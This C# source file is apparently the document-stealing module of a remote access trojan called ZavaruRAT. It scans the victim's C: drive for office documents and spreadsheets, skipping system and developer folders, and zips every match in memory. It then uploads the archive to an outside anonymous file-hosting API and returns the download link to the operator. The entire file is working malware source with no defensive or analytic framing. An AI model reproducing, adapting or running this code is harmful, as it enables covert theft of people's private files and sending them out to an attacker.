#region

using System.Diagnostics;
using System.IO.Compression;
using System.Net.Http.Json;
using System.Text.Json;
using ZavaruRAT.Client.Sdk;

#endregion

namespace ZavaruRAT.Client.Modules;

public sealed class FileStealerModule : ModuleBase
{
    private static readonly HttpClient HttpClient = new();

    private static readonly List<string> DocsIgnore = new()
    {
        "system32",
        "program files",
        "windows",
        "Adobe",
        "JetBrains",
        "Code",
        "Packages",
        "Cache",
        "Temp",
        "tmp",
        "npm",
        "yarn",
        "node_modules",
        "Yandex",
        "Extension",
        "servicing",
        "license",
        "readme"
    };

    private static readonly List<string> DocsExtensions = new()
    {
        ".odt",
        ".ott",
        ".fodt",
        ".uot",
        ".docx",
        ".dotx",
        ".doc",
        ".rtf",
        ".ods",
        ".ots",
        ".uos",
        ".xlsx",
        ".xls",
        ".csv",
        ".xlsm"
    };

    private async Task<string?> UploadFile(Stream f, string filename)
    {
        // https://anonfiles.com/docs/api

        var form = new MultipartFormDataContent();
        form.Add(new StreamContent(f), "file", filename);

        var res = await HttpClient.PostAsync("https://api.filechan.org/upload", form);
        var resp = await res.Content.ReadFromJsonAsync<JsonDocument>();

        if (!resp!.RootElement.GetProperty("status").GetBoolean())
        {
            return null;
        }

        return resp.RootElement
                   .GetProperty("data")
                   .GetProperty("file")
                   .GetProperty("url")
                   .GetProperty("short")
                   .GetString();
    }

    public async Task<ExecutionResult> StealDocs()
    {
        var docs = Utilities
                   .EnumerateDirectories("C:\\", "*", DocsIgnore)
                   .Where(x =>
                              DocsExtensions
                                  .Any(y =>
                                           x.Extension.IndexOf(y, StringComparison.InvariantCultureIgnoreCase) != -1)
                         )
                   .Where(x => x is FileInfo);

        var ms = new MemoryStream();
        var zip = new ZipArchive(ms, ZipArchiveMode.Create, true);

        foreach (var doc in docs)
        {
            Debug.WriteLine("Processing {0}", (object)doc.FullName);

            var entry = zip.CreateEntry(Guid.NewGuid() + "_" + doc.Name);
            await using var entryStream = entry.Open();
            await using var fileStream = File.OpenRead(doc.FullName);
            await fileStream.CopyToAsync(entryStream);
        }

        zip.Dispose();
        ms.Position = 0;

        var url = await UploadFile(ms, "docs.zip");

        if (string.IsNullOrWhiteSpace(url))
        {
            throw new Exception("Unable to generate link");
        }

        return new ExecutionResult
        {
            Result = url
        };
    }
}
